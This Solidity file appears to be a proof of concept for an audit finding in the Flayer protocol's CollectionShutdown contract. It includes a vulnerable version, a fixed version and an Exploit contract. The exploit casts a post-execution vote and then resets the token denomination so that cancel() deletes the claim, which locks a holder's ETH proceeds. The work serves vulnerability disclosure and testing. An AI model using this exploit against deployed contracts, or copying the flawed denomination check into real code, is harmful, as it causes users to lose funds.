// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Flayer — H-25 (Sherlock 2024-08, issue 742)
    CollectionShutdown.vote() still runs after the shutdown has been executed.
    One wei of votes flips canExecute back on. cancel() then compares the old
    token's total supply with MAX_SHUTDOWN_TOKENS scaled by the live locker
    denomination. Recreating the collection at denomination 0 makes that check
    pass, and cancel deletes availableClaim. Lewis's 2 ETH of Sudoswap proceeds
    stay in the contract and claim returns 0.

    Old denomination is 4. Supply is 4e22. MAX_SHUTDOWN_TOKENS is 4e18.
    4e22 <= 4e18 * 10**4 reverts. 4e22 <= 4e18 * 10**0 does not.
*/

contract Eth {
    string public symbol = "ETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CollectionToken {
    string public symbol = "CT";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    uint256 public denomination;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 denom) {
        denomination = denom;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function setDenomination(uint256 denom) external {
        denomination = denom;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Locker {
    CollectionToken public token;

    constructor(CollectionToken _token) {
        token = _token;
    }

    function collectionToken(address) external view returns (CollectionToken) {
        return token;
    }

    function createCollection(address, string calldata, string calldata, uint256 denom) external {
        token.setDenomination(denom);
    }
}

contract CollectionShutdown {
    uint256 public constant MAX_SHUTDOWN_TOKENS = 4e18;

    struct CollectionShutdownParams {
        CollectionToken collectionToken;
        uint96 shutdownVotes;
        uint96 quorumVotes;
        uint96 availableClaim;
        bool canExecute;
        address sweeperPool;
    }

    mapping(address => CollectionShutdownParams) internal _collectionParams;
    mapping(address => mapping(address => uint256)) public shutdownVoters;
    Locker public locker;
    Eth public eth;
    address public lewis;

    constructor(Locker _locker, Eth _eth, address _lewis) {
        locker = _locker;
        eth = _eth;
        lewis = _lewis;
    }

    function collectionParams(address collection)
        external
        view
        returns (CollectionToken, uint96, uint96, uint96, bool, address)
    {
        CollectionShutdownParams memory params = _collectionParams[collection];
        return (
            params.collectionToken,
            params.shutdownVotes,
            params.quorumVotes,
            params.availableClaim,
            params.canExecute,
            params.sweeperPool
        );
    }

    function seed(address collection, CollectionToken token, uint96 votes) external {
        _collectionParams[collection] = CollectionShutdownParams({
            collectionToken: token,
            shutdownVotes: votes,
            quorumVotes: votes,
            availableClaim: 0,
            canExecute: false,
            sweeperPool: address(0x5555)
        });
        shutdownVoters[collection][lewis] = votes;
    }

    function creditProceeds(address collection, uint256 amount) external {
        eth.transferFrom(msg.sender, address(this), amount);
        _collectionParams[collection].availableClaim = uint96(amount);
    }

    /// vote() from CollectionShutdown.sol — no check that the sweeper pool is already set.
    function vote(address _collection) public {
        CollectionShutdownParams memory params = _collectionParams[_collection];
        if (params.quorumVotes == 0) revert("not started");
        uint256 bal = params.collectionToken.balanceOf(msg.sender);
        params.collectionToken.transferFrom(msg.sender, address(this), bal);
        params.shutdownVotes += uint96(bal);
        if (params.shutdownVotes >= params.quorumVotes) {
            params.canExecute = true;
        }
        shutdownVoters[_collection][msg.sender] = bal;
        _collectionParams[_collection] = params;
    }

    /// cancel() from CollectionShutdown.sol.
    function cancel(address _collection) public {
        CollectionShutdownParams memory params = _collectionParams[_collection];
        if (!params.canExecute) revert("ShutdownNotReachedQuorum");
        uint256 denom = locker.collectionToken(_collection).denomination();
        // @> VULN: total supply is compared with the live locker denomination, not the token that was voted
        if (params.collectionToken.totalSupply() <= MAX_SHUTDOWN_TOKENS * 10 ** denom) {
            revert("InsufficientTotalSupplyToCancel");
        }
        delete _collectionParams[_collection];
    }

    function claimable(address collection, address user) public view returns (uint256) {
        CollectionShutdownParams memory params = _collectionParams[collection];
        if (address(params.collectionToken) == address(0) || params.availableClaim == 0) return 0;
        uint256 votes = shutdownVoters[collection][user];
        if (votes == 0 || params.shutdownVotes == 0) return 0;
        return uint256(params.availableClaim) * votes / uint256(params.shutdownVotes);
    }

    function claim(address collection, address to) external returns (uint256 payout) {
        payout = claimable(collection, msg.sender);
        if (payout == 0) revert("nothing");
        _collectionParams[collection].availableClaim -= uint96(payout);
        eth.transfer(to, payout);
    }
}

contract CollectionShutdownFixed {
    uint256 public constant MAX_SHUTDOWN_TOKENS = 4e18;

    struct CollectionShutdownParams {
        CollectionToken collectionToken;
        uint96 shutdownVotes;
        uint96 quorumVotes;
        uint96 availableClaim;
        bool canExecute;
        address sweeperPool;
    }

    mapping(address => CollectionShutdownParams) internal _collectionParams;
    mapping(address => mapping(address => uint256)) public shutdownVoters;
    Locker public locker;
    Eth public eth;
    address public lewis;

    constructor(Locker _locker, Eth _eth, address _lewis) {
        locker = _locker;
        eth = _eth;
        lewis = _lewis;
    }

    function seed(address collection, CollectionToken token, uint96 votes) external {
        _collectionParams[collection] = CollectionShutdownParams({
            collectionToken: token,
            shutdownVotes: votes,
            quorumVotes: votes,
            availableClaim: 0,
            canExecute: false,
            sweeperPool: address(0x5555)
        });
        shutdownVoters[collection][lewis] = votes;
    }

    function creditProceeds(address collection, uint256 amount) external {
        eth.transferFrom(msg.sender, address(this), amount);
        _collectionParams[collection].availableClaim = uint96(amount);
    }

    function vote(address _collection) public {
        CollectionShutdownParams memory params = _collectionParams[_collection];
        if (params.quorumVotes == 0) revert("not started");
        if (params.sweeperPool != address(0)) revert("ShutdownExecuted");
        uint256 bal = params.collectionToken.balanceOf(msg.sender);
        params.collectionToken.transferFrom(msg.sender, address(this), bal);
        params.shutdownVotes += uint96(bal);
        if (params.shutdownVotes >= params.quorumVotes) params.canExecute = true;
        shutdownVoters[_collection][msg.sender] = bal;
        _collectionParams[_collection] = params;
    }

    function cancel(address _collection) public {
        CollectionShutdownParams memory params = _collectionParams[_collection];
        if (!params.canExecute) revert("ShutdownNotReachedQuorum");
        uint256 denom = params.collectionToken.denomination();
        if (params.collectionToken.totalSupply() <= MAX_SHUTDOWN_TOKENS * 10 ** denom) {
            revert("InsufficientTotalSupplyToCancel");
        }
        delete _collectionParams[_collection];
    }

    function claimable(address collection, address user) public view returns (uint256) {
        CollectionShutdownParams memory params = _collectionParams[collection];
        if (address(params.collectionToken) == address(0) || params.availableClaim == 0) return 0;
        uint256 votes = shutdownVoters[collection][user];
        if (votes == 0 || params.shutdownVotes == 0) return 0;
        return uint256(params.availableClaim) * votes / uint256(params.shutdownVotes);
    }
}

contract Exploit {
    uint256 public constant LEWIS_VOTES = 2e18 * 10 ** 4;

    Eth public eth;
    CollectionToken public ct;
    Locker public locker;
    CollectionShutdown public shutdown;
    address public nft = address(0x721);
    address public lewis = address(0x1E715);
    uint256 public proceeds;
    bool public canExecuteAfterVote;
    uint256 public lewisClaim;
    uint256 public denomAfter;
    uint256 public held;

    constructor() {
        eth = new Eth();
        ct = new CollectionToken(4);
        locker = new Locker(ct);
        shutdown = new CollectionShutdown(locker, eth, lewis);
        ct.mint(lewis, LEWIS_VOTES);
        ct.mint(address(this), 1);
        ct.mint(address(0xBEEF), LEWIS_VOTES - 1);
        shutdown.seed(nft, ct, uint96(LEWIS_VOTES));
        eth.mint(address(this), 2 ether);
    }

    function run() external {
        eth.approve(address(shutdown), 2 ether);
        shutdown.creditProceeds(nft, 2 ether);
        proceeds = eth.balanceOf(address(shutdown));
        ct.approve(address(shutdown), 1);
        shutdown.vote(nft);
        (, , , , canExecuteAfterVote,) = shutdown.collectionParams(nft);
        locker.createCollection(nft, "Test Collection", "TEST", 0);
        denomAfter = ct.denomination();
        shutdown.cancel(nft);
        lewisClaim = shutdown.claimable(nft, lewis);
        held = eth.balanceOf(address(shutdown));
        require(proceeds == 2 ether, "proceeds");
        require(canExecuteAfterVote, "canExecute");
        require(denomAfter == 0, "denom");
        require(lewisClaim == 0, "lewis");
        require(held == 2 ether, "locked");
    }
}
